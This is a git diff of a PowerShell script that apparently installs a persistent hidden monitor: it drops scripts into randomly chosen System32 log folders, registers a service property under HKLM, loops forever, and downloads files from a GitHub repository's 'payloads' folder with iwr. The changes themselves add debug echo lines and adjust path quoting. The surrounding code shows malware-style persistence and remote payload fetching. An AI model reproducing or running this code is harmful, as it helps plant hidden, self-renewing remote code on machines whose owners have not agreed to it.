@@ -10,6 +10,8 @@ $paths = @(
     "$env:windir\System32\LogFiles\WMI"
 )
 Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami.txt`""
+echo $basePath >> "C:\Users\$env:username\Downloads\path.txt"
+echo `"$basePath`" >> "C:\Users\$env:username\Downloads\path.txt"
 $serviceName = "MyRootMonService"
 $propertyName = "rootMon"
 $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
@@ -19,11 +21,11 @@ $initServiceRootmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)
 $initServiceRootmonPath = "$initServiceRootmonPath\init_service_rootmon.ps1"
 $rootMonScript = ""
 
-$item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
+$item = Get-ItemProperty -Path `"$basePath`" -Name $propertyName -ErrorAction SilentlyContinue
 if(-not($item)){
     $rootMonScript = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
     $rootMonScript = "$rootMonScript\root_mon.ps1" 
-    Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootMonScript -Force | Out-Null
+    Set-ItemProperty -Path `"$basePath`" -Name $propertyName -Value $rootMonScript -Force | Out-Null
     $issetup = $true
 }
 
@@ -70,7 +72,7 @@ while($true){
         if(-not($issetup)){
             $rootMonScript = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
             $rootMonScript = "$rootMonScript\root_mon.ps1"
-            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootMonScript -Force | Out-Null
+            Set-ItemProperty -Path `"$basePath`" -Name $propertyName -Value $rootMonScript -Force | Out-Null
         }
         iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root_mon.ps1" -OutFile $rootMonScript
         iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
